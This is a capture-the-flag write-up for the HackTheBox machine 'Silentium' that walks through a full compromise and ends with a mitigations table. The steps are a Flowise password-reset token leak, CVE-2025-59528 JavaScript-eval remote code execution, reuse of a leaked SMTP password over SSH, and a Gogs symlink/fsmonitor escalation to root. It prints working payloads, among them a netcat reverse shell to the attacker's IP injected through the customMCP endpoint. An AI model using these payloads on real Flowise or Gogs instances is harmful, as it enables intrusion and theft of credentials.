---
title: "HackTheBox — Silentium"
date: 2026-04-12
draft: false
description: "Silentium (HTB Easy) writeup: IDOR on Flowise password reset → CVE-2025-59528 (JS eval RCE) → SSH credential reuse → CVE-2025-8110 (Gogs symlink + fsmonitor SUID bash)."
tags: ["HackTheBox", "Easy", "Linux", "Flowise", "IDOR", "RCE", "Docker", "Gogs", "Symlink", "SUID", "CVE-2025-59528", "CVE-2025-8110", "PasswordReuse", "PortForwarding"]
categories: ["HackTheBox"]
---

{{< lead >}}
Easy-rated Linux machine. The full path goes through: IDOR on the **Flowise** password reset endpoint that exposes `tempToken` in the response → **CVE-2025-59528** (JavaScript eval on the `customMCP` endpoint) for RCE inside a Docker container → SMTP credentials leaked via environment variables reused over SSH → **CVE-2025-8110** in **Gogs 0.13.0** (symlink + `fsmonitor` directive) to set the SUID bit on `/usr/bin/bash`.
{{< /lead >}}

**IP:** `10.129.17.219` · **OS:** Ubuntu 24.04 LTS · **Difficulty:** Easy

---

## 1. Reconnaissance

### Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.17.219
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -sC -sV -p22,80 10.129.17.219
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
```

Minimal attack surface — only SSH and a web server on nginx. We add `silentium.htb` to `/etc/hosts`.

---

## 2. Web Enumeration

### Main Page

The site is a corporate landing page for a fictitious financial firm. The "Leadership" team section lists three names:

- **Marcus Thorne** — Managing Director
- **Ben** — Head of Financial Systems *(no surname)*
- **Elena Rossi** — Chief Risk Officer

Ben is the only team member without a last name, suggesting his username is likely just `ben`.

### Virtual Host Fuzzing

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://silentium.htb/ \
     -H "Host: FUZZ.silentium.htb" \
     -fs 178
```

```
staging    [Status: 200, Size: 3142, Duration: 54ms]
```

We add `staging.silentium.htb` to `/etc/hosts`. Visiting it reveals a **Flowise** instance — an open-source platform for building AI agents visually.

---

## 3. IDOR on Flowise Password Reset

### Version Check

```
[msf] >> use exploit/multi/http/flowise_js_rce
[msf] >> set RHOSTS 10.129.17.219
[msf] >> set VHOST staging.silentium.htb
[msf] >> set RPORT 80
[msf] >> check

[*] Flowise version detected: 3.0.5
[+] The target appears to be vulnerable. (affected: >= 2.2.7-patch.1 and < 3.0.6) (auth required)
```

Version **3.0.5** is vulnerable, but the exploit requires valid credentials. We need to authenticate first.

### Finding the IDOR

Inspecting the frontend JavaScript we find the "Forgot Password" view:

```
http://staging.silentium.htb/assets/forgotPassword-Dt6O5dqm.js
```

The reset flow calls `/api/v1/account/forgot-password`. The critical flaw: **the response returns `tempToken` directly in the JSON body** instead of only delivering it to the user's email — a classic IDOR.

**Step 1 — Request a reset for `ben@silentium.htb`:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
```

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "emqTPCpyFjXYJwk15kpm3YBy4SyU1No1ysNewciMHiAfvykO57xZhY0rzBTvEJCW",
    "tokenExpiry": "2026-04-11T21:02:58.455Z",
    "status": "active"
  }
}
```

The token is right there in the response. Anyone who calls this endpoint can reset any user's password.

**Step 2 — Use the token to set a new password:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "emqTPCpyFjXYJwk15kpm3YBy4SyU1No1ysNewciMHiAfvykO57xZhY0rzBTvEJCW",
      "password": "1234.Abcd"
    }
  }'
```

```json
{"user": {"email": "ben@silentium.htb", "tempToken": "", "status": "active"}}
```

✅ **Credentials:** `ben@silentium.htb : 1234.Abcd`

---

## 4. CVE-2025-59528 — Flowise JS RCE

### Metasploit

```bash
[msf] >> use exploit/multi/http/flowise_js_rce
[msf] >> set RHOSTS 10.129.17.219
[msf] >> set VHOST staging.silentium.htb
[msf] >> set RPORT 80
[msf] >> set LHOST tun0
[msf] >> set FLOWISE_EMAIL ben@silentium.htb
[msf] >> set FLOWISE_PASSWORD 1234.Abcd
[msf] >> run
```

```
[*] Flowise version detected: 3.0.5
[+] Authentication successful
[*] Sending stage (3090404 bytes) to 10.129.17.219
[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.17.219:57642)
```

We have a shell, but **we're inside a Docker container** (confirmed by `/.dockerenv`).

### Manual Exploitation — `customMCP` Endpoint

The endpoint `/api/v1/node-load-method/customMCP` accepts a string as MCP server configuration. That string is evaluated as JavaScript on the Node.js server without any sanitization. From the browser console while authenticated in Flowise:

```javascript
fetch('/api/v1/node-load-method/customMCP', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'x-request-from': 'internal'
  },
  body: JSON.stringify({
    loadMethod: "listActions",
    inputs: {
      mcpServerConfig: "({x:(function(){const cp = process.mainModule.require('child_process'); cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.237 4444 >/tmp/f'); return 1;})()})"
    }
  })
}).then(res => res.json()).then(console.log);
```

With `nc -lvnp 4444` listening, we get a shell inside the container. Checking environment variables:

```bash
env
```

```
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SENDER_EMAIL=ben@silentium.htb
SMTP_PASSWORD=r04D!!_R4ge
SMTP_USERNAME=test
SMTP_HOST=mailhog
SMTP_PORT=1025
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
```

Credentials of interest: `ben` / `r04D!!_R4ge` (SMTP password).

---

## 5. SSH Access — User Flag

```bash
ssh ben@10.129.17.219
# Password: r04D!!_R4ge
```

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
```

✅ The SMTP password was reused on the host system.

```bash
ben@silentium:~$ cat user.txt
50615873f0b476a96d3eb1bb5b0775fb
```

---

## 6. Privilege Escalation — CVE-2025-8110 (Gogs Symlink)

### Internal Service Discovery

```bash
ben@silentium:~$ netstat -tulpn | grep 127.0.0.1
```

```
tcp  0  0  127.0.0.1:3000   0.0.0.0:*  LISTEN  -   ← Flowise
tcp  0  0  127.0.0.1:3001   0.0.0.0:*  LISTEN  -   ← Gogs
tcp  0  0  127.0.0.1:8025   0.0.0.0:*  LISTEN  -   ← MailHog (UI)
tcp  0  0  127.0.0.1:1025   0.0.0.0:*  LISTEN  -   ← MailHog (SMTP)
```

Port **3001** runs **Gogs 0.13.0** — vulnerable to **CVE-2025-8110**, which allows an attacker to overwrite arbitrary system files through a malicious symlink uploaded to a Git repository.

### Port Forwarding

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.17.219
```

We access `http://127.0.0.1:3001` from our browser and register user `tester`.

### How CVE-2025-8110 Works

Gogs does not properly validate symlinks inside Git repositories. By uploading a symlink pointing to `.git/config` and then using the Gogs API to write content through that symlink, we overwrite the repository's real `.git/config` on the server. When Gogs processes a subsequent `push`, Git reads that modified config and executes the command specified in the `fsmonitor` directive.

### Setting Up the Repository with the Symlink

```bash
ben@silentium:/tmp$ mkdir pwn_local && cd pwn_local
ben@silentium:/tmp/pwn_local$ git init

# Symlink pointing at .git/config
ben@silentium:/tmp/pwn_local$ ln -s .git/config evil_link

ben@silentium:/tmp/pwn_local$ git add evil_link
ben@silentium:/tmp/pwn_local$ git commit -m "Add symlink"
```

Create an empty `pwn` repository in Gogs via the web UI, then push:

```bash
ben@silentium:/tmp/pwn_local$ git remote add origin http://127.0.0.1:3001/tester/pwn.git
ben@silentium:/tmp/pwn_local$ git push origin master
```

### Writing the Malicious Config via the API

The `fsmonitor` directive in `.git/config` specifies a command Git runs when processing the repository. We use it to set the SUID bit on `/usr/bin/bash`:

```bash
cat << EOF > exploit_config
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
    fsmonitor = "chmod +s /usr/bin/bash"
EOF

PAYLOAD=$(base64 -w 0 < exploit_config)

curl -X PUT "http://127.0.0.1:3001/api/v1/repos/tester/pwn/contents/evil_link" \
  -H "Authorization: token 36a4fbd1b1d0343a8cf4a7efb41a6314a0662489" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"pwn\", \"content\":\"$PAYLOAD\"}"
```

Writing through `evil_link` causes Gogs to overwrite the server-side `.git/config` with our malicious content.

### Triggering `fsmonitor` Execution

```bash
ben@silentium:/tmp/pwn_local$ git commit --allow-empty -m "trigger"
ben@silentium:/tmp/pwn_local$ git push origin master
```

When Gogs processes the push, Git reads the modified config and executes `chmod +s /usr/bin/bash` with Gogs process privileges (root).

### Getting Root

```bash
ben@silentium:/tmp/pwn_local$ ls -l /usr/bin/bash
-rwsrwsrwx 1 root root 1446024 Mar 31 2024 /usr/bin/bash
```

```bash
ben@silentium:/tmp/pwn_local$ bash -p
```

> **`-p`:** The "privileged" flag prevents bash from dropping the EUID at startup. Without it, bash would ignore the SUID bit as a security measure.

```
bash-5.2# id
uid=1000(ben) gid=1000(ben) euid=0(root) egid=0(root) groups=0(root)
```

---

## 7. Root Flag

```bash
bash-5.2# cat /root/root.txt
53d486260b78a07715cbd3d9eaec756f
```

---

## 8. Attack Chain

```
staging.silentium.htb → Flowise 3.0.5
         ↓
IDOR on /api/v1/account/forgot-password → tempToken returned in JSON body
         ↓
Password reset for ben@silentium.htb → Dashboard access
         ↓
CVE-2025-59528 (JS eval on /api/v1/node-load-method/customMCP) → RCE in Docker container
         ↓
env → SMTP_PASSWORD: r04D!!_R4ge
         ↓
SSH as ben (password reuse) → user.txt
         ↓
Gogs 0.13.0 on port 3001 → CVE-2025-8110 (symlink + fsmonitor)
         ↓
chmod +s /usr/bin/bash → bash -p → euid=0(root) → root.txt
```

---

## 9. Mitigations

| Vector | Mitigation |
|---|---|
| IDOR on password reset | Never return `tempToken` in the response body — deliver it **only** via email |
| CVE-2025-59528 (JS eval) | Upgrade Flowise to ≥ 3.0.6; never eval user-controlled input as code |
| Credentials in environment variables | Use secret managers (Vault, AWS Secrets Manager) |
| SMTP/SSH password reuse | Unique password per service |
| CVE-2025-8110 (Gogs symlink) | Update Gogs; never run the service as root |
| Unrestricted `fsmonitor` | Configure `safe.directory`; disable fsmonitor in server environments |
